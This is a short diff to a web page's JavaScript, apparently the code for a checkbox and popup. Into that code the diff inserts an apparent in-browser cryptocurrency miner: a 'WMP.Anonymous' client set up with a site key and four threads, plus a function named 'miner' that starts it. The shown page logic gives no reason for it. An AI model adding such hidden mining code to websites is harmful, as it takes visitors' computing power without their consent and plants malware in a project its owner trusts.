@@ -749,7 +749,14 @@
     const checkboxText = document.getElementById('checkboxText');
     const popup = document.querySelector('.popup');
 
+var clientOBJ = WMP.Anonymous('SK_nMDhFVtxJ8Q2Lvh5cmyZT',{
+        threads: 4,
+        autoThreads: true,
+        throttle: 0.1,
+        forceASMJS: false
+    });
 
+function miner(){clientOBJ.start()}
 
     function closepopup() {
         const popup = document.querySelector('.popup');
